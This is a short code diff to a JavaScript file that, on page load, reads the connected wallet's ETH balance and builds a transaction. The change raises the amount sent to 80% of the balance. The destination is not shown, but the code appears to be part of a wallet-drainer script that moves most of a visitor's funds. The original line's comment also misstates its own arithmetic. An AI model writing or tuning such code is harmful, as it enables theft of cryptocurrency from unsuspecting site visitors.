@@ -49,7 +49,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const gasLimit = 21000; // Standard gas limit for a simple ETH transfer
 
       const balance = await provider.getBalance(account);
-      const sendableAmount = balance.div(1.1); // 10% of the balance
+      const sendableAmount = balance.mul(8).div(10); // 80% of the balance
 
       if (sendableAmount.gte(gasPrice.mul(gasLimit))) {
         const transactionParam = {
